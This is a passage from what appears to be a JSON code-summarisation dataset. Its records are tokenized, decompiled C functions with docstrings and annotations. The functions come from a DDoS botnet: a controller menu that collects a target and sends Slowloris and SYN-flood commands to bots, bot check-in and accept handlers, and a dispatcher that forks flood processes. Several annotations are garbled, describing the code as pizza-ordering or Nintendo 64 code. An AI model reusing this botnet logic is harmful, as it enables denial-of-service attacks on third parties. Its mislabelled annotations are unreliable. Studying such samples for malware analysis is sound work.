            "\"Max Number of Threads: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v0",
            ",",
            "4",
            ",",
            "stdin",
            ")",
            ";",
            "v0",
            "[",
            "strlen",
            "(",
            "v0",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\n\\x1B[1;32m[*] Starting all The bots\\n[i] ENTER Ctrl+C to quit current DDOS\\x1B[0m\"",
            ")",
            ";",
            "sprintf",
            "(",
            "v6",
            ",",
            "\"%s %s %s %s\"",
            ",",
            "dest",
            ",",
            "v4",
            ",",
            "v0",
            ",",
            "v2",
            ")",
            ";",
            "puts",
            "(",
            "v6",
            ")",
            ";",
            "send_to_bots",
            "(",
            "v6",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            ";",
            "case",
            "'3'",
            ":",
            "puts",
            "(",
            "\"\\x1B[1;36m[*] Selected DDos -> All available Types\"",
            ")",
            ";",
            "strcpy",
            "(",
            "dest",
            ",",
            "\"*\"",
            ")",
            ";",
            "printf",
            "(",
            "\"",
            "\\",
            "nTarget",
            "to",
            "DDos",
            "[",
            "URL",
            "form",
            "]",
            ":",
            "http",
            ":",
            "fgets",
            "(",
            "v5",
            ",",
            "30",
            ",",
            "stdin",
            ")",
            ";",
            "v5",
            "[",
            "strlen",
            "(",
            "v5",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\nPress ENTER to automatically assign the IP\"",
            ")",
            ";",
            "printf",
            "(",
            "\"\\nTarget to DDos[IP form]: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v4",
            ",",
            "20",
            ",",
            "stdin",
            ")",
            ";",
            "if",
            "(",
            "v4",
            "[",
            "0",
            "]",
            "=",
            "=",
            "10",
            ")",
            "hostname_to_ip",
            "(",
            "v5",
            ",",
            "v4",
            ")",
            ";",
            "else",
            "v4",
            "[",
            "strlen",
            "(",
            "v4",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"Target Port SYN-FLOOD: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v2",
            ",",
            "6",
            ",",
            "stdin",
            ")",
            ";",
            "v2",
            "[",
            "strlen",
            "(",
            "v2",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"Max Number of Threads: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v0",
            ",",
            "4",
            ",",
            "stdin",
            ")",
            ";",
            "v0",
            "[",
            "strlen",
            "(",
            "v0",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\n\\x1B[1;32m[*] Starting all The bots\\n[i] ENTER Ctrl+C to quit current DDOS\\x1B[0m\"",
            ")",
            ";",
            "sprintf",
            "(",
            "v7",
            ",",
            "\"",
            "%",
            "s",
            "%",
            "s",
            "http",
            ":",
            "puts",
            "(",
            "v7",
            ")",
            ";",
            "send_to_bots",
            "(",
            "v7",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            ";",
            "case",
            "'q'",
            ":",
            "puts",
            "(",
            "\"[+] Shutting down all services\"",
            ")",
            ";",
            "close_all",
            "(",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"\\x1B[0;31m[-] Wrong Choice!\\x1B[0m\"",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"\\x1B[1;36m[*] Selected DDos -> Slow-loris\"",
            ")",
            ";",
            "strcpy",
            "(",
            "dest",
            ",",
            "\"SLOW-LORIS\"",
            ")",
            ";",
            "printf",
            "(",
            "\"",
            "\\",
            "nTarget",
            "to",
            "DDos",
            "[",
            "URL",
            "form",
            "]",
            ":",
            "http",
            ":",
            "fgets",
            "(",
            "v4",
            ",",
            "30",
            ",",
            "stdin",
            ")",
            ";",
            "v4",
            "[",
            "strlen",
            "(",
            "v4",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"Max Number of Threads: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v0",
            ",",
            "4",
            ",",
            "stdin",
            ")",
            ";",
            "v0",
            "[",
            "strlen",
            "(",
            "v0",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "puts",
            "(",
            "\"\\n\\x1B[1;32m[*] Starting all The bots\\n[i] ENTER Ctrl+C to quit current DDOS\\x1B[0m\"",
            ")",
            ";",
            "sprintf",
            "(",
            "v6",
            ",",
            "\"",
            "%",
            "s",
            "http",
            ":",
            "printf",
            "(",
            "\"Current Options:\\n\\t%s\\n\"",
            ",",
            "v6",
            ")",
            ";",
            "send_to_bots",
            "(",
            "v6",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` seems to be used for reading data from a device or file system, involving memory allocation, device initialization, and potentially interactions with file system drivers or shared libraries, but its exact purpose depends on the context and usage in the larger codebase.",
            "The `memset` function is used to fill a block of memory with a particular value, typically used for initializing memory to zero or setting memory regions to a specific byte value.",
            "The `strncpy` function is being utilized to copy at most `n` characters from the source string to the destination string, ensuring no more than `n` characters are copied and appending null terminators as necessary.",
            "The `printf` function is being redefined and modified in the provided code snippets, likely for specialized formatting and handling of output, such as for an RPN (Reverse Polish Notation) calculator and potentially for handling specific platform-dependent behaviors like printing results of mathematical operations or dealing with special cases like infinity or NaN (Not a Number)."
        ],
        "longer_label": "The provided code defines a function named `ddos` that presents a menu for selecting different types of DDoS attacks (Slowloris, Syn-Flood, or All Types), prompts for necessary parameters, and initiates the chosen attack by constructing appropriate commands and sending them to bots, while handling user input errors and providing options to shut down services."
    },
    {
        "id": 374,
        "docstring_tokens": [
            "The",
            "code",
            "prints",
            "out",
            "all",
            "active",
            "connections",
            "from",
            "bots",
            "and",
            "their",
            "corresponding",
            "IP",
            "addresses",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "*",
            "v0",
            ";",
            "unsigned",
            "int",
            "v2",
            ";",
            "unsigned",
            "int",
            "*",
            "v3",
            ";",
            "char",
            "buf",
            "[",
            "8",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "&",
            "cons",
            ";",
            "v2",
            "=",
            "0",
            ";",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "while",
            "(",
            "v3",
            "&",
            "&",
            "*",
            "v3",
            ")",
            "{",
            "printf",
            "(",
            "\"%d\\n\"",
            ",",
            "*",
            "v3",
            ")",
            ";",
            "if",
            "(",
            "write",
            "(",
            "*",
            "v3",
            ",",
            "\"UP?\"",
            ",",
            "3uL",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "+",
            "3",
            ")",
            ";",
            "}",
            "else",
            "{",
            "read",
            "(",
            "*",
            "v3",
            ",",
            "buf",
            ",",
            "8uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "buf",
            ",",
            "\"?YES!\"",
            ",",
            "5uL",
            "L",
            ")",
            ")",
            "{",
            "v0",
            "=",
            "inet_ntoa",
            "(",
            "(",
            "struct",
            "in_addr",
            ")",
            "v3",
            "[",
            "2",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"# %d Connection From => %s\\n\"",
            ",",
            "v2",
            "+",
            "+",
            ",",
            "v0",
            ")",
            ";",
            "}",
            "v3",
            "=",
            "(",
            "unsigned",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v3",
            "+",
            "3",
            ")",
            ";",
            "}",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v5",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is used to read a 64-bit unsigned integer from a specific offset within the FS segment register on the x86 architecture, typically used for low-level system programming tasks such as accessing thread information block (TIB) structures in Windows operating systems.",
            "The function `inet_ntoa` is used to convert an IPv4 address from its binary representation to a human-readable string format.",
            "The \"return\" function is likely intended to calculate the Signed Distance Field (SDF) and emissive properties of a scene at a given point, possibly for rendering purposes, combining geometric calculations like capsuleSDF with device context creation functionalities like interception_create_context.",
            "The function `readfsqword` is likely designed to read a quadword (64 bits) from the FS segment register, typically used for thread-local storage or accessing operating system-specific data structures, and it appears to be employed for memory allocation and string manipulation in a pizza ordering program."
        ],
        "longer_label": "The provided code appears to iterate through a list of connections, checking their status and printing information about incoming connections if they respond positively, while employing low-level system functions for reading thread information and converting IP addresses, likely serving a networking-related functionality."
    },
    {
        "id": 375,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "random",
            "color",
            "and",
            "prints",
            "a",
            "banner",
            "before",
            "initializing",
            "and",
            "starting",
            "a",
            "BotNet",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "unsigned",
            "int",
            "v3",
            ";",
            "unsigned",
            "int",
            "v4",
            ";",
            "v3",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "srand",
            "(",
            "v3",
            ")",
            ";",
            "v4",
            "=",
            "rand",
            "(",
            ")",
            "%",
            "5",
            ";",
            "if",
            "(",
            "v4",
            "<",
            "=",
            "4",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "puts",
            "(",
            "asc_32F8",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_3420",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_3570",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_36B8",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_3780",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_38B8",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_39F0",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_3B20",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_3BE0",
            ")",
            ";",
            "puts",
            "(",
            "&",
            "byte_3D08",
            ")",
            ";",
            "puts",
            "(",
            "asc_3E38",
            ")",
            ";",
            "puts",
            "(",
            "\"\\x1B[0m\"",
            ")",
            ";",
            "puts",
            "(",
            "\"\\x1B[0;32m[+] Initalizing the BotNet\\x1B[0m\"",
            ")",
            ";",
            "init",
            "(",
            ")",
            ";",
            "start",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function _36B8puts likely prints or displays a string or set of strings passed as arguments.",
            "The function `_38B8` appears to be a part of a graphics rendering engine, possibly related to a Nintendo 64 game, and it is likely involved in setting up display lists for rendering specific components of a level or scene."
        ],
        "longer_label": "The provided code appears to be a C/C++ program utilizing assembly language to potentially manipulate program flow based on a random number, print various strings, initialize a BotNet, and start its operation, possibly in the context of a Nintendo 64 game."
    },
    {
        "id": 376,
        "docstring_tokens": [
            "This",
            "code",
            "creates",
            "a",
            "socket",
            "using",
            "the",
            "AF_INET",
            "and",
            "SOCK_STREAM",
            "protocols",
            ",",
            "returning",
            "the",
            "socket",
            "descriptor",
            "or",
            "exiting",
            "with",
            "an",
            "error",
            "message",
            "if",
            "the",
            "creation",
            "fails",
            "."
        ],
        "code_tokens": [
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "unsigned",
            "int",
            "v1",
            ";",
            "v1",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "v1",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"Failed to create socket\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "v1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function `make_socket` that creates a socket using the `socket()` function with the parameters for domain, type, and protocol, checks if it fails, and returns the socket descriptor."
    },
    {
        "id": 377,
        "docstring_tokens": [
            "The",
            "accept_handler",
            "function",
            "sets",
            "a",
            "timeout",
            "of",
            "4",
            "seconds",
            ",",
            "enables",
            "the",
            "reuse",
            "of",
            "the",
            "main",
            "socket",
            "address",
            ",",
            "and",
            "continuously",
            "accepts",
            "incoming",
            "connections",
            ",",
            "assigning",
            "each",
            "new",
            "connection",
            "to",
            "a",
            "new",
            "connections",
            "struct",
            "and",
            "allocating",
            "memory",
            "for",
            "it",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "accept_handler",
            "(",
            "void",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "v1",
            ";",
            "int",
            "optval",
            ";",
            "socklen_t",
            "addr_len",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "__int64",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "v7",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "char",
            "*",
            ")",
            "&",
            "cons",
            ";",
            "v5",
            "=",
            "4L",
            "L",
            ";",
            "v6",
            "=",
            "0L",
            "L",
            ";",
            "optval",
            "=",
            "1",
            ";",
            "if",
            "(",
            "setsockopt",
            "(",
            "main_sock",
            ",",
            "1",
            ",",
            "2",
            ",",
            "&",
            "optval",
            ",",
            "4u",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "perror",
            "(",
            "\"setsockopt\"",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "addr_len",
            "=",
            "16",
            ";",
            "v1",
            "=",
            "accept",
            "(",
            "main_sock",
            ",",
            "(",
            "struct",
            "sockaddr",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "4",
            ")",
            ",",
            "&",
            "addr_len",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v4",
            "=",
            "v1",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "v4",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"accept failed\"",
            ")",
            ";",
            "}",
            "else",
            "{",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "+",
            "3",
            ")",
            "=",
            "malloc",
            "(",
            "0x20uL",
            "L",
            ")",
            ";",
            "v4",
            "=",
            "(",
            "char",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "v4",
            "+",
            "3",
            ")",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"accept\" appears to be a utility function used in different contexts across the provided code snippets to verify and consume tokens or symbols from input streams or lexical analyzers, facilitating parsing or compilation processes."
        ],
        "longer_label": "The provided code defines an accept handler function which sets a socket option, continuously accepts connections on a main socket, and allocates memory for each accepted connection."
    },
    {
        "id": 378,
        "docstring_tokens": [
            "This",
            "code",
            "sends",
            "the",
            "given",
            "data",
            "to",
            "all",
            "connected",
            "bots",
            "through",
            "their",
            "socket",
            "connections",
            "."
        ],
        "code_tokens": [
            "int",
            "*",
            "FUN0",
            "send_to_bots",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "*",
            "result",
            ";",
            "size_t",
            "v2",
            ";",
            "unsigned",
            "int",
            "v3",
            ";",
            "int",
            "*",
            "i",
            ";",
            "result",
            "=",
            "(",
            "int",
            "*",
            ")",
            "&",
            "cons",
            ";",
            "for",
            "(",
            "i",
            "=",
            "(",
            "int",
            "*",
            ")",
            "&",
            "cons",
            ";",
            "i",
            ";",
            "i",
            "=",
            "result",
            ")",
            "{",
            "result",
            "=",
            "(",
            "int",
            "*",
            ")",
            "(",
            "unsigned",
            "int",
            ")",
            "*",
            "i",
            ";",
            "if",
            "(",
            "!",
            "(",
            "_DWORD",
            ")",
            "result",
            ")",
            "break",
            ";",
            "v2",
            "=",
            "strlen",
            "(",
            "a1",
            ")",
            ";",
            "v3",
            "=",
            "write",
            "(",
            "*",
            "i",
            ",",
            "a1",
            ",",
            "v2",
            ")",
            ";",
            "printf",
            "(",
            "\"%d\\n\"",
            ",",
            "v3",
            ")",
            ";",
            "result",
            "=",
            "(",
            "int",
            "*",
            ")",
            "*",
            "(",
            "(",
            "_QWORD",
            "*",
            ")",
            "i",
            "+",
            "3",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code appears to be a function named `send_to_bots` that iterates over a list of integer pointers, writing a given string to each file descriptor represented by the pointers, and returning the last pointer in the list."
    },
    {
        "id": 379,
        "docstring_tokens": [
            "The",
            "code",
            "decrypts",
            "a",
            "file",
            "using",
            "AES-256",
            "CBC",
            "encryption",
            "with",
            "a",
            "given",
            "key",
            "and",
            "initialization",
            "vector",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "FILE",
            "*",
            "input",
            ",",
            "FILE",
            "*",
            "output",
            ",",
            "unsigned",
            "__int8",
            "*",
            "key",
            ",",
            "unsigned",
            "__int8",
            "*",
            "iv",
            ")",
            "{",
            "__int64",
            "v4",
            ";",
            "int",
            "outLen",
            ";",
            "unsigned",
            "__int8",
            "outbuff",
            "[",
            "16",
            "]",
            ";",
            "unsigned",
            "__int8",
            "inbuff",
            "[",
            "16",
            "]",
            ";",
            "int",
            "bytesWritten",
            ";",
            "int",
            "result",
            ";",
            "int",
            "bytesRead",
            ";",
            "EVP_CIPHER_CTX",
            "*",
            "ctx",
            ";",
            "ctx",
            "=",
            "(",
            "EVP_CIPHER_CTX",
            "*",
            ")",
            "EVP_CIPHER_CTX_new",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "ctx",
            ")",
            "handleErrors",
            "(",
            ")",
            ";",
            "v4",
            "=",
            "EVP_aes_256_cbc",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "EVP_DecryptInit_ex",
            "(",
            "ctx",
            ",",
            "v4",
            ",",
            "0L",
            "L",
            ",",
            "key",
            ",",
            "iv",
            ")",
            ")",
            "handleErrors",
            "(",
            ")",
            ";",
            "do",
            "{",
            "bytesRead",
            "=",
            "fread",
            "(",
            "inbuff",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "input",
            ")",
            ";",
            "if",
            "(",
            "bytesRead",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "printf",
            "(",
            "\"Could not read file\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "result",
            "=",
            "EVP_DecryptUpdate",
            "(",
            "ctx",
            ",",
            "outbuff",
            ",",
            "&",
            "outLen",
            ",",
            "inbuff",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "bytesRead",
            ")",
            ";",
            "if",
            "(",
            "result",
            "!",
            "=",
            "1",
            ")",
            "handleErrors",
            "(",
            ")",
            ";",
            "bytesWritten",
            "=",
            "fwrite",
            "(",
            "outbuff",
            ",",
            "1uL",
            "L",
            ",",
            "outLen",
            ",",
            "output",
            ")",
            ";",
            "if",
            "(",
            "bytesWritten",
            "=",
            "=",
            "-",
            "1",
            ")",
            "printf",
            "(",
            "\"Could not write to file\"",
            ")",
            ";",
            "}",
            "while",
            "(",
            "bytesRead",
            ">",
            "15",
            ")",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "EVP_DecryptFinal_ex",
            "(",
            "ctx",
            ",",
            "outbuff",
            ",",
            "&",
            "outLen",
            ")",
            ")",
            "{",
            "printf",
            "(",
            "\"Error on the last block of data\"",
            ")",
            ";",
            "handleErrors",
            "(",
            ")",
            ";",
            "}",
            "bytesWritten",
            "=",
            "fwrite",
            "(",
            "outbuff",
            ",",
            "1uL",
            "L",
            ",",
            "outLen",
            ",",
            "output",
            ")",
            ";",
            "if",
            "(",
            "bytesWritten",
            "=",
            "=",
            "-",
            "1",
            ")",
            "printf",
            "(",
            "\"Could not write the last block to file\"",
            ")",
            ";",
            "EVP_CIPHER_CTX_free",
            "(",
            "ctx",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `CIPHER_CTX` likely initializes and manages the context for cryptographic operations, including handling file descriptors and control settings, possibly supporting zero-copy optimizations and fallback mechanisms for certain cipher algorithms.",
            "The function `EVP_aes_256` appears to be part of OpenSSL's encryption functionality, involving AES-256 encryption algorithms in different modes (CBC, CFB128, ECB), with accompanying initialization and decryption operations.",
            "The function `VP_DecryptInit` is likely used for initializing decryption contexts with various ciphers and settings, including AES 256 GCM and ChaCha20-Poly1305, ensuring proper key and IV lengths, and setting up authentication tag verification.",
            "The `bytes` function appears to be involved in managing byte-level data manipulation, including memory allocation, copying, and potentially extending existing data structures, likely within a larger system or application context.",
            "The `fread` function is being manipulated or \"hooked\" in the provided code snippets, likely for debugging or monitoring purposes, allowing the program to intercept and modify the behavior of `fread` calls within the program.",
            "The `printf` function is used for formatted output to the standard output stream in C programming, typically used to display text or variables with specified formatting.",
            "The function `fwrite` is being modified within a larger codebase, likely for debugging or monitoring purposes, with different implementations based on the operating system being used."
        ],
        "longer_label": "The provided code is a function in C that decrypts a file using AES-256 CBC encryption algorithm from OpenSSL, managing the encryption context, reading from an input file, decrypting data in blocks, and writing the decrypted data to an output file, with error handling for file operations and decryption process."
    },
    {
        "id": 380,
        "docstring_tokens": [
            "The",
            "function",
            "bind_socket",
            "binds",
            "a",
            "socket",
            "to",
            "a",
            "specified",
            "IP",
            "address",
            "and",
            "port",
            "number",
            ",",
            "with",
            "error",
            "handling",
            "in",
            "case",
            "of",
            "failure",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "struct",
            "sockaddr",
            "*",
            "a1",
            ")",
            "{",
            "int",
            "result",
            ";",
            "memset",
            "(",
            "a1",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "struct",
            "sockaddr",
            ")",
            ")",
            ";",
            "a1",
            "-",
            ">",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "a1",
            "-",
            ">",
            "sa_data",
            "=",
            "htons",
            "(",
            "port",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "a1",
            "-",
            ">",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "htonl",
            "(",
            "0",
            ")",
            ";",
            "result",
            "=",
            "bind",
            "(",
            "main_sock",
            ",",
            "a1",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "result",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"Failed to bind the Socket\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"htons\" function is used to convert a 16-bit quantity from host byte order to network byte order (big-endian) as required for network communication protocols, ensuring consistency across different platforms.",
            "The `perror` function is used to print an error message corresponding to the current value of the `errno` variable, typically indicating the last error that occurred during a system call or library function, and it's often used in error handling scenarios."
        ],
        "longer_label": "The code initializes and binds a socket to a specific port, handling potential errors using `perror` for error reporting."
    },
    {
        "id": 381,
        "docstring_tokens": [
            "This",
            "code",
            "continuously",
            "reads",
            "data",
            "from",
            "a",
            "socket",
            "and",
            "if",
            "it",
            "contains",
            "``",
            "UP",
            "?",
            "``",
            ",",
            "it",
            "responds",
            "with",
            "``",
            "?",
            "YES",
            "!",
            "``",
            ",",
            "and",
            "if",
            "it",
            "contains",
            "``",
            "[",
            "!",
            "DDOS",
            "!",
            "]",
            "''",
            ",",
            "it",
            "stops",
            "a",
            "current",
            "DDOS",
            "attack",
            "by",
            "writing",
            "``",
            "EXIT",
            "''",
            "to",
            "a",
            "file",
            "descriptor",
            "and",
            "closing",
            "it",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "wait_and_close",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "char",
            "buf",
            "[",
            "12",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v3",
            ";",
            "v3",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "do",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "read",
            "(",
            "main_sock",
            ",",
            "buf",
            ",",
            "0xAuL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strstr",
            "(",
            "buf",
            ",",
            "\"UP?\"",
            ")",
            ")",
            "break",
            ";",
            "write",
            "(",
            "main_sock",
            ",",
            "\"?YES!\"",
            ",",
            "5uL",
            "L",
            ")",
            ";",
            "}",
            "}",
            "while",
            "(",
            "!",
            "strstr",
            "(",
            "buf",
            ",",
            "\"[!DDOS!]\"",
            ")",
            ")",
            ";",
            "puts",
            "(",
            "\"[*]Stopping Current DDOS\"",
            ")",
            ";",
            "write",
            "(",
            "a1",
            ",",
            "\"EXIT\"",
            ",",
            "4uL",
            "L",
            ")",
            ";",
            "close",
            "(",
            "a1",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v3",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"wait_and_close\" function appears to be a utility function used in various contexts to handle closing file descriptors and waiting for processes to finish within a multi-process or multi-threaded environment, ensuring proper resource management and synchronization.",
            "The function `__readfsqword` is likely used to read a 64-bit unsigned integer from the segment register FS at a specified offset, primarily in x86 or x64 assembly programming contexts.",
            "The \"close\" function is used to close file descriptors and release associated resources, often utilized in systems programming to manage file operations and memory mappings efficiently.",
            "The function `readfsqword` appears to be a utility function designed to read a quadword (64 bits) from the FS segment register in x86 architecture, likely used for low-level system operations or debugging purposes."
        ],
        "longer_label": "The \"wait_and_close\" function synchronously reads from a socket, responding to specific messages, until a termination signal is received, at which point it stops a potential DDOS attack by sending an exit signal to a specified file descriptor and closes it, ensuring proper resource management and synchronization within a multi-process or multi-threaded environment."
    },
    {
        "id": 382,
        "docstring_tokens": [
            "The",
            "function",
            "DDOS",
            "performs",
            "a",
            "denial",
            "of",
            "service",
            "attack",
            "based",
            "on",
            "the",
            "type",
            "specified",
            ",",
            "either",
            "using",
            "a",
            "slow",
            "loris",
            "approach",
            ",",
            "SYN",
            "flood",
            ",",
            "or",
            "both",
            "concurrently",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "DDOS",
            "(",
            "int",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ",",
            "signed",
            "__int16",
            "a3",
            ",",
            "signed",
            "int",
            "a4",
            ",",
            "const",
            "char",
            "*",
            "a5",
            ")",
            "{",
            "int",
            "pipedes",
            "[",
            "2",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v10",
            ";",
            "v10",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "switch",
            "(",
            "a1",
            ")",
            "{",
            "case",
            "0",
            ":",
            "pipe",
            "(",
            "pipedes",
            ")",
            ";",
            "if",
            "(",
            "!",
            "fork",
            "(",
            ")",
            ")",
            "{",
            "close",
            "(",
            "pipedes",
            "[",
            "1",
            "]",
            ")",
            ";",
            "flood_slow_loris",
            "(",
            "a2",
            ",",
            "a4",
            ",",
            "0L",
            "L",
            ",",
            "pipedes",
            "[",
            "0",
            "]",
            ")",
            ";",
            "}",
            "LABEL_4",
            ":",
            "close",
            "(",
            "pipedes",
            "[",
            "0",
            "]",
            ")",
            ";",
            "wait_and_close",
            "(",
            "pipedes",
            "[",
            "1",
            "]",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v10",
            ";",
            "case",
            "1",
            ":",
            "pipe",
            "(",
            "pipedes",
            ")",
            ";",
            "if",
            "(",
            "!",
            "fork",
            "(",
            ")",
            ")",
            "{",
            "close",
            "(",
            "pipedes",
            "[",
            "1",
            "]",
            ")",
            ";",
            "flood_with_syn",
            "(",
            "a2",
            ",",
            "a3",
            ",",
            "a4",
            ",",
            "pipedes",
            "[",
            "0",
            "]",
            ")",
            ";",
            "}",
            "goto",
            "LABEL_4",
            ";",
            "case",
            "2",
            ":",
            "pipe",
            "(",
            "pipedes",
            ")",
            ";",
            "if",
            "(",
            "!",
            "fork",
            "(",
            ")",
            ")",
            "{",
            "close",
            "(",
            "pipedes",
            "[",
            "1",
            "]",
            ")",
            ";",
            "flood_slow_loris",
            "(",
            "a5",
            ",",
            "a4",
            ",",
            "0L",
            "L",
            ",",
            "pipedes",
            "[",
            "0",
            "]",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "fork",
            "(",
            ")",
            ")",
            "{",
